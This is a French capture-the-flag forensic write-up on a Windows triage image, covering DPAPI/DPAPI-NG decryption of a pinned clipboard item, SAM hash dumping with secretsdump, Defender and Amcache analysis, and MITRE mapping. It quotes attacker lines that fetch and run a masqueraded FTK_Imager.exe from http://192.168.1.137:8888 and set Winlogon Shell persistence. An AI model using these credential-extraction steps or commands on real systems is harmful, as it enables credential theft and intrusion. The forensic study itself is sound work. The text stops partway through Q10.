---
title: L3akCTF - RID Triage (Forensic)
time: 2026-07-24 12:00:00
categories: [ctf]
tags: [forensic, windows, dpapi, registry, mft, defender, amcache]
image: /assets/posts/l3akctf/cover.png
---

Nous devons répondre à 20 questions afin d'avoir le flag.

# Forensic

## RID Triage

### Q1 : Quel était le dernier texte copié par l'utilisateur ?

Je sais que c'est la question qui a posé problème à la plupart des gens, et c'est probablement la question la plus difficile de tout le défi.

Avant de commencer, il y a une chose importante à savoir : tout texte copié par un utilisateur sous Windows peut être enregistré dans l'historique du Presse-papiers, à condition que cette option soit activée dans les paramètres Windows.

Normalement, les données copiées sont stockées uniquement dans la mémoire vive (RAM). Cela signifie qu'une fois l'ordinateur redémarré ou éteint, elles sont perdues et irrécupérables.

La seule exception concerne les éléments épinglés du presse-papiers. Si l'utilisateur épingle un élément dans l'historique du presse-papiers, celui-ci reste enregistré même après le redémarrage de l'ordinateur.

Étant donné que le défi ne nous donne que le système de fichiers et non un vidage mémoire, il est raisonnable de supposer que le dernier texte enregistré dans le presse-papiers est un élément épinglé, car les entrées normales du presse-papiers auraient disparu une fois l'ordinateur éteint.

Après quelques recherches, nous savons que les éléments épinglés du presse-papiers sont enregistrés sous :

```
C:\Users\[user]\AppData\Local\Microsoft\Windows\Clipboard\Pinned
```

Comme vous pouvez le constater, il existe un dossier nommé :

```
{798B828F-A438-42E0-B37F-D4DAB06AA7AC}
```

À l'intérieur, il y a un autre dossier nommé :

```
{D4315CDF-3E40-4E08-B8BA-220AF192A67F}
```

Il existe également un fichier appelé `metadata.json`.

Il contient uniquement des métadonnées sur l'élément copié, comme son type de données et son niveau de chiffrement. Il ne contient pas le texte copié lui-même.

Si nous ouvrons le dossier `{D4315CDF-3E40-4E08-B8BA-220AF192A67F}`, nous trouverons trois fichiers :

```
metadata.json
TG9jYWxl
VGV4dA==
```

Le fichier `metadata.json` ne contient que des métadonnées sur l'élément du presse-papiers, telles que le type de données et s'il est chiffré ; nous ne l'utiliserons donc pas pour récupérer le texte copié.

Les deux autres fichiers, `TG9jYWxl` et `VGV4dA==`, contiennent les données du presse-papiers. J'ai essayé de lire les deux fichiers, mais je n'y ai rien trouvé de lisible. C'est alors que j'ai vérifié le fichier `metadata.json` et que j'ai réalisé que les données étaient chiffrées (`"isEncrypted":true`).

Au début je suis tombé sur [cette page de Passcape](https://www.passcape.com/index.php?page=1393) qui expliquait que Windows utilise le chiffrement (CNG) pour protéger l'historique épinglé et les données synchronisées. Mais c'était l'ancienne techno utilisée.

En continuant dans mes recherches sur comment ces fichiers sont chiffrés, je suis tombé sur [Windows DPAPI Fundamentals](http://medium.com/@toneillcodes/windows-dpapi-fundamentals-69af5169ffe8) et [Decoding DPAPI Blobs](https://medium.com/@toneillcodes/decoding-dpapi-blobs-1ed9b4832cf6) (ce deuxième blog complète parfaitement le premier en expliquant la structure des fichiers chiffrés), qui détaillent très bien le fonctionnement de ce chiffrement.

Les blobs chiffrés par DPAPI commencent par la séquence d'octets suivante, ce qui permet de les repérer facilement :

```
01 00 00 00 D0 8C 9D DF 01 15 D1 11 8C 7A 00 C0 4F C2 97 EB
```

#### Fonctionnement global de DPAPI

DPAPI est un système de chiffrement au niveau du système d'exploitation Windows qui protège les données sensibles. Voici le flux complet :

**1. Génération de la MasterKey**

```
Mot de passe utilisateur
        ↓
Password-Based Key Derivation (PKCS #5)
        ↓
Clé dérivée du mot de passe
        ↓
Triple-DES encryption
        ↓
MasterKey chiffrée (stockée)
```

Windows génère une MasterKey. Cette clé est protégée par le mot de passe de l'utilisateur. Elle est stockée à : `C:\Users\[USER]\AppData\Roaming\Microsoft\Protect\$SID\$GUID`

Elle expire tous les 3 mois (mais les anciennes clés sont archivées, pas supprimées).

**2. Génération de la SessionKey**

```
MasterKey + Données aléatoires + Entropy optionnel
        ↓
Dérivation de clé symétrique
        ↓
SessionKey (jamais stockée)
```

Une SessionKey unique est générée à partir de la MasterKey. Elle n'est jamais stockée sur le disque.

Les données aléatoires utilisées pour la générer sont stockées dans le blob chiffré lui-même. Cette clé de session est ensuite utilisée pour chiffrer les vraies données (notre texte du presse-papiers).

**3. Chiffrement des données**

```
Texte original (notre contenu copié)
        ↓
SessionKey + Algorithme AES/3DES
        ↓
Blob chiffré = [Données chiffrées + Données aléatoires + Métadonnées]
        ↓
Stocké dans les fichiers TG9jYWxl et VGV4dA==
```

#### Récapitulatif du flux complet

Pour accéder au texte copié, il faudrait :

1. Récupérer la MasterKey chiffrée depuis `Protect\$SID\$GUID`
2. La déchiffrer avec le mot de passe utilisateur (via PKCS #5 + Triple-DES)
3. Récupérer les données aléatoires stockées dans le blob chiffré
4. Régénérer la SessionKey à partir de la MasterKey + données aléatoires
5. Déchiffrer le blob avec cette SessionKey pour obtenir le texte original

En analysant le système, j'ai trouvé des fichiers dans `C:\Users\[USER]\AppData\Roaming\Microsoft\Protect\$SID\$GUID`.

```
Preferred
5062878a-368c-47a4-b76e-93521f1d6950
d309364b-c93b-48f8-a906-291356636964
db9cb5eb-52d1-48f2-9133-53288754a0e1
```

J'ai réussi à trouver le mot de passe de l'utilisateur bello (`@algeria@relizane48!`). J'avais une archive sur le serveur qui contenait `Database.kdbx` et `KeePassv7.DMP` ; en utilisant [keepass-password-dumper](https://github.com/vdohney/keepass-password-dumper), j'ai réussi à dumper le mot de passe de la base de données KeePass, ce qui m'a permis d'avoir le mot de passe de l'utilisateur bello.

NB : Donc parfois, si SAM et SECURITY ne mènent à rien, prendre le temps de fouiller l'artefact pour d'éventuelles pistes.

Afin de savoir quelle MasterKey utiliser pour déchiffrer nos fichiers, j'ai utilisé cet outil : [DPAPIBlobReader](https://github.com/toneillcodes/dpapi-projects/tree/main/DPAPIBlobReader)

```bash
dotnet run /file:/home/korpstation/leak/Export/TG9jYWxl /stdout /outfile:./test
Processing filename: /home/korpstation/leak/Export/TG9jYWxl
[*] Blob Summary
[>] Filename: /home/korpstation/leak/Export/TG9jYWxl
[>] File hash (SHA-256): 0xd423eea29ac205c545a4f007f11cf3d89ccb3860c987e3acde0a09023f853982
[>] Blob start position: 45.
[>] Final blob pointer position: 307
[>] Remaining bytes: 166
[>] Blob Structure:
dwVerion:			0x01000000
guidProvider:			0xd08c9ddf0115d1118c7a00c04fc297eb:(df9d8cd0-1501-11d1-8c7a-00c04fc297eb)
dwMasterKeyVersion:		0x01000000
guidMasterKey:			0x4b3609d33bc9f848a906291356636964:(d309364b-c93b-48f8-a906-291356636964)
dwFlags:			0x00000000
dwDescriptionLen:		0x02000000:(2)
szDescription:			0x0000
algCrypt:			0x10660000
dwAlgCryptLen:			0x00010000:(256)
dwSaltLen:			0x20000000:(32)
pbSalt:				0xbcf0dae1bd3d54eba07407f32323637ccf688f021e4d745d7236e7dc1773633f
dwHmacKeyLen:			0x00000000:(0)
pbHmackKey:			0x0000000000000000
algHash:			0x0e800000
dwAlgHashLen:			0x00020000:(512)
dwHmac2KeyLen:			0x20000000:(32)
pbHmack2Key:			0x4c91dab6d00b2589bb2bbe0f5a3f8bc015ec1ebf13f645f6b62e06dba323d803
dwDataLen:			0x30000000:(48)
pbData:				0xe66187cc0f76ac6107a88f59791e747980b004053d91fe07b5e1d1814417be132b91e53871de959076646ff2f098e8db
dwSignLen:			0x40000000:(64)
pbSign:				0x632ac449cb129fc2fcb897f78008f3d5559f2bc3f687c00bf48977ec9440958c9537cc130ab7ff3273bb557b286426467b008a4560a545fdbd2820da783c3357
```

Donc cet outil nous donne le GUID de la MasterKey utilisée. On sait directement quelle MasterKey on doit utiliser.

Avec ces infos, j'ai essayé d'obtenir la clé pour le déchiffrement, mais ça ne marchait pas.

```bash
dpapi.py masterkey -sid S-1-5-21-1256453946-4022582877-3363549628-1001 -password '@algeria@relizane48!' -file 157-d309364b-c93b-48f8-a906-291356636964
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : d309364b-c93b-48f8-a906-291356636964
Flags       :        5 (5)
Policy      :        0 (0)
MasterKeyLen: 000000b0 (176)
BackupKeyLen: 00000090 (144)
CredHistLen : 00000014 (20)
DomainKeyLen: 00000000 (0)

Cannot decrypt (specify -key or -sid whenever applicable)
```

Par la suite, en continuant mes recherches, j'ai découvert que pour un compte local ou de domaine (AD), la clé de déchiffrement de la MasterKey est dérivée directement du mot de passe de connexion de l'utilisateur, via PBKDF2/SHA1, combiné au SID :

```
Mot de passe de connexion → SHA1/PBKDF2 → clé symétrique → déchiffre la MasterKey
```

C'est pour ça que la commande fonctionne parfaitement pour un compte local classique avec `-password 'motdepasse_de_connexion'`.

#### Pourquoi ça casse avec un compte Microsoft (MSA)

Pour un compte lié à un compte Microsoft, Windows n'utilise pas le mot de passe que tu tapes à l'écran de connexion comme matériau de dérivation DPAPI. À la place :

- Lors de la première connexion MSA, Windows génère un mot de passe DPAPI synthétique, aléatoire, complètement différent du mot de passe MSA réel.
- Ce mot de passe synthétique est ensuite chiffré et mis en cache localement, à cet emplacement précis :

```
C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\CloudAPCache\MicrosoftAccount\[Account ID]\Cache\CacheData
```

Ce cache est lui-même protégé par le mot de passe MSA réel (`@algeria@relizane48!`), mais indirectement, via un mécanisme de dérivation propre à Microsoft (lié à l'authentification en ligne), et non via DPAPI directement.

C'est exactement le rôle de [MadPassExt](https://www.nirsoft.net/utils/microsoft_account_dpapi_password.html) : il prend le vrai mot de passe MSA, déchiffre ce cache CloudAPCache, et en extrait le mot de passe DPAPI synthétique (`bfTgEhUz5ahU2WmmKzCjoQ1YfP3dpSAjtQQ119Wushg=`).

#### Le problème de DPAPI-NG

Le DPAPI classique chiffre des données pour un seul utilisateur, sur une seule machine : la MasterKey du compte suffit à tout déchiffrer.

Mais DPAPI-NG répond à un besoin différent : partager un secret entre plusieurs machines ou plusieurs comptes (par exemple le presse-papiers partagé entre appareils, LAPS, ou des secrets liés à un groupe Active Directory). Pour ça, Microsoft a ajouté une couche : au lieu de chiffrer directement avec du matériel dérivé de ton mot de passe, on chiffre avec une clé aléatoire (la CEK), et cette clé aléatoire est elle-même protégée par quelque chose que seul le bon destinataire peut reconstituer (la KEK). C'est le principe classique du chiffrement en enveloppe (envelope encryption).

**KEK : Key Encryption Key**

La KEK n'est pas stockée telle quelle nulle part. Elle est dérivée à partir de la MasterKey. C'est ce que nous venons d'obtenir avec dpapi.

```bash
(myenv-3.11) ┌──(myenv-3.11)─(korpstation㉿korpstation)-[~/leak/Export]
└─$ dpapi.py masterkey -sid S-1-5-21-1256453946-4022582877-3363549628-1001 -password 'bfTgEhUz5ahU2WmmKzCjoQ1YfP3dpSAjtQQ119Wushg=' -file 157-d309364b-c93b-48f8-a906-291356636964
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : d309364b-c93b-48f8-a906-291356636964
Flags       :        5 (5)
Policy      :        0 (0)
MasterKeyLen: 000000b0 (176)
BackupKeyLen: 00000090 (144)
CredHistLen : 00000014 (20)
DomainKeyLen: 00000000 (0)

Decrypted key with User Key (SHA1)
Decrypted key: 0xcbacbecbfadc098ece0a605bbb4330e0510fc353ce3025732bfe82a73aede25c69f91cee1d29f43e5eaa73f068aca1beddc712a2f51c5609a52f10cf7d0672c2
```

Cette clé, je pensais que c'était la KEK et que ça allait marcher, mais j'ai finalement compris que ce n'était pas du tout la KEK, mais la MasterKey déchiffrée. J'ai alors continué mes recherches et j'ai fini par utiliser [DPAPI Data Decryptor](https://www.nirsoft.net/utils/dpapi_data_decryptor.html) avec la clé donnée par MadPassExt pour obtenir le bon KEK.

Pour utiliser le logiciel avec wine, j'ai utilisé ces options :

Protects files :

```
Z:\home\korpstation\Downloads\leakctf\Forensic\L3akCTF_RID_triage_handout\final_triage\C\Users\bello\AppData\Roaming\Microsoft\Protect
Z:\home\korpstation\Downloads\leakctf\Forensic\L3akCTF_RID_triage_handout\final_triage\C\Windows\System32\Microsoft\Protect
```

Registry Folders :

```
Z:\home\korpstation\Downloads\leakctf\Forensic\L3akCTF_RID_triage_handout\final_triage\C\Windows\System32\config
```

En faisant cela, nous avons obtenu le vrai KEK :

```
610EB082DFD750B346326C02949B3B0DE7F90D966E2527A97E40FE039097354C
```

**CEK : Content Encryption Key, et le rôle du Key Wrap**

Le blob DPAPI-NG contient, en clair dans sa structure ASN.1, une CEK chiffrée (« wrapped »). Elle n'est pas chiffrée avec un mode classique (CBC, GCM...), mais avec un algorithme spécial : l'algorithme de key wrap RFC 3394, qui permet de passer de la KEK à la CEK.

Pourquoi un algorithme spécial juste pour « emballer » une clé ? Parce que RFC 3394 est conçu spécifiquement pour chiffrer de petits blocs de haute entropie (une clé, pas des données arbitraires) : il n'a pas besoin d'IV explicite (il utilise une valeur d'intégrité fixe intégrée à l'algorithme) et il garantit nativement l'intégrité du déballage. C'est exactement ce que fait l'opération « AES Key Unwrap » de CyberChef : on lui donne la KEK comme clé, la CEK chiffrée comme donnée, et il ressort la CEK en clair.

En allant sur [asn1js.eu](https://asn1js.eu/), on peut extraire du blob la CEK et l'IV.


| Champ à chercher dans l'arbre | Taille | Valeur |
|---|---|---|
| OCTET STRING sous kekri, après le blob de 262 octets | 40 octets | CEK chiffrée (wrapped) |
| OCTET STRING sous parameters (algo aes256-GCM) | 12 octets | IV du GCM |
| Octets à la toute fin du fichier, en dehors de l'arbre affiché | variable | ciphertext + tag GCM |

La partie restante qui n'est pas affichée sur le site est le ciphertext et le tag. Le ciphertext est au début et le tag à la fin ; comme nous connaissons la longueur du tag, il est facile de séparer les deux. J'ai utilisé hexeditor pour ça.

La CEK obtenue à ce stade est toujours wrappée en AES, donc il faut l'unwrap :

1. Aller sur [CyberChef](https://gchq.github.io/CyberChef/)
2. Dans Input, coller la CEK chiffrée : `096A74244BC223485E3130B2B014BE3AE1DD3033018261B72C8664B5BA051CC9B5359CB3F5B89504`
3. Chercher l'opération « AES Key Unwrap » dans la liste à gauche et la glisser dans la Recipe
4. Configurer les champs de l'opération :
   - Key : la KEK, en hex : `610EB082DFD750B346326C02949B3B0DE7F90D966E2527A97E40FE039097354C`
   - IV : `a6a6a6a6a6a6a6a6` (valeur fixe standard, normalement laissée par défaut). Ce n'est pas l'IV du GCM, ne mets pas celui obtenu sur le site ASN.
   - Input : Hex
   - Output : Hex

Le résultat affiché = la CEK (32 octets) : `4cd8e33837a6e12ce8355f42ac70b6e47375552295b8d47e894856935efa5171`

**Déchiffrement final : AES-256-GCM**

Une fois la CEK obtenue, il reste à déchiffrer le contenu réel (ton presse-papiers). Là, Microsoft utilise un mode classique et authentifié : AES-256-GCM appliqué à la CEK et au blob de données.

GCM a besoin de trois choses en plus de la clé :

- l'IV/nonce, que tu avais déjà repéré dans la structure ASN.1
- le tag GCM, qui sert à vérifier que rien n'a été altéré, généralement les 16 derniers octets du blob
- le texte chiffré, c'est-à-dire le reste des données entre l'IV et le tag

Une fois ces quatre éléments réunis dans l'opération « AES-256-GCM Decrypt » de CyberChef, tu obtiens le texte en clair.

CyberChef : AES Decrypt en mode GCM (CEK → plaintext)

- Input (ciphertext seul, sans le tag) : `48 06 4F DB 61 45 0F AD 99 F7 FB 7A BF AA AC EE 54 37 E8 D9`
- Key : la CEK obtenue à l'étape précédente (hex)
- IV : `A4D1ED358D87498F4EE971BD` (le vrai nonce GCM, 12 octets)
- Mode : GCM
- Input : Hex
- GCM Tag : `B347A281C48BDDFD1626F2C1FF851407` (les 16 octets restants après le ciphertext)
- Output : Raw

Et voilà, le fichier est déchiffré : game over.

### Q3 : Quel est l'identifiant de la sous-technique MITRE ATT&CK pertinent pour la manière dont l'acteur malveillant a obtenu l'exécution sur la machine de la victime ?

En examinant les artefacts à la recherche d'éléments pouvant expliquer comment l'attaquant avait obtenu l'exécution de code, je me suis souvenu que PowerShell conserve un fichier d'historique des commandes appelé `ConsoleHost_history.txt`.

Ce fichier est créé par la fonctionnalité PSReadLine et contient les commandes exécutées dans PowerShell ([documentation Microsoft](https://learn.microsoft.com/en-us/powershell/module/psreadline/about/about_psreadline?view=powershell-7.6)).

Vous le trouverez à l'emplacement suivant :

```
C:\Users\bello\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Après avoir ouvert le fichier, j'ai remarqué plusieurs commandes PowerShell qui ne ressemblaient manifestement pas à ce qu'un utilisateur normal saisirait. Il s'agissait plutôt de longues chaînes de commandes.

Cette commande se connecte d'abord à :

```
http://192.168.1.137:8888
```

Elle utilise ensuite `System.Net.WebClient` pour télécharger un fichier depuis le serveur et l'enregistrer sous le nom :

```
C:\Users\Public\FTK_Imager.exe
```

Ensuite, elle exécute le fichier avec `Start-Process`.

J'ai également trouvé une autre commande qui modifie la stratégie d'exécution PowerShell en la définissant sur « Bypass », permettant ainsi aux scripts PowerShell de s'exécuter sans les restrictions par défaut.

L'analyse de la séquence de commandes a clairement montré que l'utilisateur avait copié-collé une commande PowerShell complète avant de l'exécuter. C'est précisément le principe de la technique ClickFix (ou copier-coller malveillant).

La technique MITRE ATT&CK correcte est donc : `T1204.004`

### Q4 : Quel est le nom du fichier du logiciel légitime sous lequel le logiciel malveillant était dissimulé ?

Dans la question précédente, nous avons trouvé le fichier `ConsoleHost_history.txt`, qui stocke l'historique des commandes PowerShell. L'une des commandes qu'il contient est :

```powershell
[io.file]::WriteAllBytes("C:\Users\Public\FTK_Imager.exe", $data)
```

Cette commande révèle que l'attaquant a enregistré la charge utile sous le nom `FTK_Imager.exe`, un outil DFIR légitime et reconnu. Cette manœuvre visait probablement à rendre le fichier inoffensif et digne de confiance.

La réponse est donc :

```
FTK_Imager.exe
```

### Q5 : Quel est le hachage SHA-1 du logiciel malveillant ?

J'ai commencé à réfléchir à l'endroit où je pourrais trouver le hachage SHA-1 du logiciel malveillant. Comme nous savions déjà, grâce à la question précédente, que le fichier malveillant s'appelait `FTK_Imager.exe`, la première chose que j'ai faite a été de vérifier le chemin d'accès utilisé par l'attaquant :

```
C:\Users\Public\FTK_Imager.exe
```

J'espérais trouver le fichier et calculer son hachage SHA-1 à l'aide d'un outil de hachage. Malheureusement, le fichier avait disparu. Il semble avoir été supprimé après l'attaque.

Après cela, j'ai pensé à Windows Defender, car il conserve souvent des informations sur les fichiers détectés, telles que le nom de la menace, le chemin d'accès au fichier et parfois les hachages SHA-1, SHA-256 et MD5.

Les artefacts sont stockés dans le chemin suivant :

```
C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory
```

En ouvrant ce chemin, nous trouverons plusieurs dossiers numérotés. Chacun contient des fichiers liés aux détections enregistrées par Windows Defender.

Cette étape m'a pris un certain temps. J'ai d'abord vérifié les fichiers des dossiers 02, 13 et 19. Ils pointaient tous vers le même échantillon de logiciel malveillant et avaient la même valeur SHA-1. Cependant, lorsque j'ai soumis ce hachage pour le défi, il a été jugé incorrect.

J'ai ensuite vérifié le dossier 18. J'y ai trouvé une autre trace du même échantillon de logiciel malveillant, mais cette fois avec une valeur SHA-1 différente. Ce dossier contenait également d'autres hachages, tels que MD5 et SHA-256, et indiquait que le logiciel malveillant avait été configuré comme interface Winlogon pour assurer sa persistance.

La valeur SHA-1 de cet enregistrement était la bonne réponse à la question :

```
02acd0e7345573217eda62b36d816e7f97f61072
```

Remarque : Je connaissais également les fichiers MPLog dans le dossier `Windows Defender\Support`, je les ai donc recherchés pour trouver le nom du fichier malveillant.

J'y ai bien trouvé une valeur SHA-1, mais c'était la même que celle que j'avais déjà trouvée dans les enregistrements DetectionHistory, et le défi ne l'a pas acceptée, comme je l'ai mentionné précédemment.

J'ai donc continué à vérifier les autres fichiers DetectionHistory jusqu'à trouver un autre enregistrement avec une valeur SHA-1 différente, et c'est celui-là qui était la bonne réponse.

Mais l'auteur du défi a dit : *« pour le SHA-1 du malware, la méthode attendue était de le récupérer depuis Amcache. Parfois on n'a pas le binaire du malware, et Windows Defender + SmartScreen sont totalement désactivés. »*

Je ne savais pas encore ce que c'était, donc j'ai fait quelques recherches et je suis tombé sur [ce blog d'IT-Connect](https://www.it-connect.fr/cours-tutoriels/securite-informatique/forensic-threat-intelligence/). Il explique presque tout en forensic Windows, avec des cas pratiques. C'est une mine d'infos.

En effet, voici un résumé :

| Artefact | Emplacement | Format | Infos utiles | Intérêt | Limite |
|---|---|---|---|---|---|
| AmCache.hve | C:\Windows\AppCompat\Programs\Amcache.hve | Hive binaire (registre) | SHA-1, SHA-256, MD5, chemin, éditeur, version, timestamps | EXCELLENT | Reste même si le fichier est supprimé ; verrouillé en live |
| ShimCache | HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache | Valeur binaire (hive SYSTEM) | Chemin de l'exécutable, timestamp du fichier, ordre LIFO | BON | Chronologie LIFO précise ; Win10/11 = présence, pas exécution certaine |
| Prefetch | C:\Windows\Prefetch\*.pf | Fichiers binaires | 8 dernières exécutions, fichiers accédés | BON | Confirmation d'exécution certaine ; peut être désactivé sur SSD |
| DetectionHistory | C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\ | Base de données binaire | SHA-1, SHA-256, MD5, nom de la menace, chemin, persistance | MOYEN-BON | Hachages complets ; dépend de WD activé |
| MPLog | C:\ProgramData\Microsoft\Windows Defender\Support\ | Fichiers .log texte | Logs simples : menace, chemin, action | FAIBLE | Lisible directement ; facilement supprimable |
| SmartScreen | C:\ProgramData\Microsoft\Windows\SmartScreen\ | Fichiers/registre | Fichiers bloqués, hachages | FAIBLE | Cible les téléchargements ; peut être désactivé |
| Journaux d'événements 4688 | C:\Windows\System32\winevt\Logs\Security.evtx | Logs binaires (.evtx) | Création de processus, parent, compte, ligne de commande | BON | Contexte complet ; peut être effacé |
| $MFT / $UsnJrnl | Racine du volume NTFS (caché) | Données NTFS | Tous les fichiers, timestamps C/M/A | EXCELLENT | Timeline complète du système ; complexe à parser |

Avec Autopsy, en me rendant à `C:\Windows\AppCompat\Programs\Amcache.hve`, l'outil permet de parser directement le fichier. En descendant l'arborescence :

```
Ruche : AmCache.hve

Naviguer vers :
  ROOT
    └─ InventoryApplicationFile
       └─ Chercher le fichier malveillant
          └─ Regarder la valeur "FileId"
             └─ C'est ton SHA-1 ! (on enlève juste les 4 premiers 0000 et c'est le SHA-1)
```

Très instructif.

### Q6 : Quelle technique furtive MITRE ATT&CK décrit le mieux l'action identifiée dans la question précédente ?

Dans la question précédente, nous avons constaté que l'attaquant avait enregistré le logiciel malveillant sous le nom `FTK_Imager.exe`, qui est celui d'un outil d'analyse forensique numérique légitime et bien connu. L'objectif était de rendre le fichier inoffensif et d'éviter d'éveiller les soupçons de l'utilisateur ou des logiciels de sécurité.

D'après le framework MITRE ATT&CK, ce comportement correspond à la technique de masquage (Masquerading). Cette technique permet de faire passer un fichier malveillant pour un fichier légitime et de confiance.

La réponse est donc : **Masquage (Masquerading)**

### Q7 : Quel est le nom d'utilisateur et le hachage NT du nouveau compte administrateur que le TA a créé comme première technique de persistance ?

La meilleure façon d'obtenir la réponse est d'utiliser l'Explorateur de registre, [Registry Explorer](https://ericzimmerman.github.io/#forensic-tools), car Autopsy n'affiche pas le NT.

Ouvrez le fichier SAM dans Registry Explorer, puis accédez au chemin suivant : `SAM\Domains\Builtin\Aliases`. Vous y trouverez tous les groupes locaux du système, y compris le groupe Administrateurs.

Ouvrez-le, et vous verrez la liste de tous ses membres. Parmi eux se trouve le SID se terminant par le RID 1002, qui appartient à l'utilisateur `bella`.

Pour le hachage NT, il suffit d'utiliser impacket pour dumper les informations :

```bash
secretsdump.py -sam ~/leak/Export/SAM -system ~/leak/Export/SYSTEM LOCAL
Impacket v0.14.0.dev0+20260812.95931.4c09897 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xe1d51c9e5d0f4fa62d72a0b3f12a007e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acfc46b3a593e0edae3e151779724a86:::
bello:1001:aad3b435b51404eeaad3b435b51404ee:b0b3cc326fc5be4dca93740163ff8406:::
bella:1002:aad3b435b51404eeaad3b435b51404ee:20bd1816be8e256a939a58da452660d7:::
[*] Cleaning up...
```

La réponse est : `bella_20bd1816be8e256a939a58da452660d7`

### Q8 : Quel est l'identifiant de la sous-technique MITRE ATT&CK pertinent pour le 2e mécanisme de persistance obtenu par le TA ?

Dans la question précédente, nous avons constaté que l'attaquant avait créé un nouvel utilisateur nommé `bella` et lui avait attribué des privilèges d'administrateur. Cependant, ce n'était pas la seule méthode de persistance qu'il a utilisée.

Je me suis souvenu que, lors de ma recherche du hachage SHA-1 dans la question précédente, j'avais déjà consulté le fichier `MPLog-20260129-234745.log`, situé à l'emplacement suivant :

```
C:\ProgramData\Microsoft\WindowsDefender\Support
```

En fouillant le fichier, j'ai vu :

```
Schema:winlogonshell
Path:HKCU@S-1-5-21-1256453946-4022582877-3363549628-1001\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON\\SHELL: C:\Users\Public\FTK_Imager.exe -server http://192.168.1.137:8888 -group blue
Threat ID:2147926848
```

Cela montre que l'attaquant a modifié la valeur de registre Winlogon Shell afin que le fichier malveillant s'exécute automatiquement à chaque connexion de l'utilisateur.

Cela permet au logiciel malveillant de continuer à fonctionner même après le redémarrage du système, ce qui constitue un second mécanisme de persistance utilisé par l'attaquant.

Dans le cadre de référence MITRE ATT&CK, cette technique correspond à :

**T1547.004 : Exécution automatique au démarrage ou à l'ouverture de session : DLL d'assistance Winlogon**

### Q9 : MS Windows Defender a signalé le fichier/objet malveillant responsable du deuxième mécanisme de persistance identifié dans la question précédente. Quelle est sa taille de suivi des menaces (en octets) ?

Dans un premier temps, j'ai décidé de consulter les journaux de Windows Defender situés à l'emplacement suivant :

```
C:\ProgramData\Microsoft\Windows Defender\Support
```

J'ai également vérifié les fichiers DetectionHistory situés à l'emplacement suivant :

```
C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory\
```

Cependant, j'ai rencontré un problème. Les fichiers DetectionHistory étant des fichiers binaires, lorsque je les ouvrais ou tentais d'en extraire des chaînes de caractères, seules quelques valeurs étaient lisibles. Je ne pouvais pas visualiser correctement toutes les données.

J'ai donc cherché un outil capable d'analyser ce type de fichier. Après quelques recherches, j'ai trouvé un excellent outil appelé [Defender DetectionHistory Parser](https://github.com/jklepsercyber/defender-detectionhistory-parser/).

Il analyse les fichiers DetectionHistory et en extrait toutes les informations dans un format clair et facile à lire.

Après avoir exécuté l'outil sur le fichier, j'ai pu consulter toutes les informations stockées dans l'enregistrement de détection. L'un des champs était `ThreatTrackingSize`.

```bash
(myenv-3.11) ┌──(myenv-3.11)─(korpstation㉿korpstation)-[~/leak/Export]
└─$ python dhparser.py -f 7B7EA81B-F238-40A2-B45D-0E4B6195A778 -o ./test

---------------------------------------
DetectionHistory Parser v1.0.1 by Jordan Klepser
https://github.com/jklepsercyber/
---------------------------------------

Found DetectionHistory file "7B7EA81B-F238-40A2-B45D-0E4B6195A778" at 7B7EA81B-F238-40A2-B45D-0E4B6195A778.

1 of 1 DetectionHistory files found were successfully parsed, with output written to "./test" in 0.073545607 seconds.
---------------------------------------
```

La sortie était sous cette forme :

```json
{
    "GUID": "7b7ea81b-f238-40a2-b45d-0e4b6195a778",
    "Magic.Version": "1.2",
    "Trojan": "Win64/SandCat.RTS!MTB",
    "ThreatStatusID": 4,
    "file": "C:\\Users\\Public\\FTK_Imager.exe",
    "ThreatTrackingSha256": "5f19105627d690496aa7801aea55200412131cb1e1be482f1535d8d8e2007024",
    "ThreatTrackingSigSeq": "0x000055787b3609a2",
    "ThreatTrackingId": "54C6C7E7-1249-4F75-821E-78FC41A33E2B",
    "ThreatTrackingStartTime": "07-24-2026 02:57:47",
    "ThreatTrackingThreatName": "Trojan:Win64/SandCat.RTS!MTB",
    "ThreatTrackingSha1": "02acd0e7345573217eda62b36d816e7f97f61072",
    "ThreatTrackingSigSha": "5b92106ff59d10345af5740d19bac209e30678a0",
    "ThreatTrackingSize": 7866880,
    "ThreatTrackingMD5": "ef15d9374f784c02dbe4c799860e40b1",
    "ThreatTrackingScanFlags": "",
    "ThreatTrackingIsEsuSig": "",
    "ThreatTrackingThreatId": 2147926848,
    "ThreatTrackingScanSource": "",
    "ThreatTrackingScanType": "",
    "process": "pid:5284,ProcessStart:134293354468194721",
    "winlogonshell": "HKCU@S-1-5-21-1256453946-4022582877-3363549628-1001\\SOFTWARE\\MICROSOFT\\WINDOWS NT\\CURRENTVERSION\\WINLOGON\\\\SHELL: C:\\Users\\Public\\FTK_Imager.exe -server http://192.168.1.137:8888 -group blue",
    "User": "DESKTOP-0G20ROC\\bello",
    "SpawningProcessName": "C:\\Users\\Public\\FTK_Imager.exe",
    "SecurityGroup": "NT AUTHORITY\\SYSTEM"
}
```

Il contenait notre trackingsize. La réponse est : `7866880`

### Q10 : L'assistant d'enseignement a téléchargé un logiciel RMM sur le système pour des activités ultérieures. Quel est le nom de l'outil et quand a-t-il été téléchargé ?

Un logiciel RMM (Remote Monitoring and Management) est un outil centralisé qui permet de surveiller, de gérer et de maintenir à distance un parc informatique (ordinateurs, serveurs, réseaux) de manière proactive.

Après avoir passé beaucoup de temps à vérifier l'historique du navigateur, les téléchargements et même le cache du navigateur, je n'ai toujours trouvé aucune trace de l'outil que je recherchais.

